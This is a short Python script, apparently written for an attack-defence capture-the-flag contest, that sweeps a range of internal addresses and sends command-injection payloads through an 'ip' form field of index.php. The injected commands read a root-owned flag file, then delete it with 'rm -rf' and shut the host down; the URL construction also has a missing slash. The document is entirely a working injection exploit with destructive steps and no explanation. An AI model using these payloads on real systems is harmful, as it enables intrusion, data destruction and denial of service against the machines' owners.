import requests

for ip3 in range(106, 116):
    try:
        ip = "172.16."+str(ip3)+".245"
        url = "http://"+str(ip)+"index.php"
        post_data = {"ip": "127.0.0.1 | cat /root/flagvalue.txt","Submit": "Submint"}
        post_html = requests.post(
            url, data=post_data)
        print(post_html)
        f = open(str(ip)+".html", "w", encoding="utf-8")
        f.write(post_html.text)
        f.close()
        post_data = {"ip": "127.0.0.1 | rm -rf /root/flagvalue.txt","Submit": "Submint"}
        post_html = requests.post(
            url, data=post_data)
        post_data = {"ip": "127.0.0.1 | shutdown now","Submit": "Submint"}
        post_html = requests.post(
            url, data=post_data)
    except Exception as e:
        pass
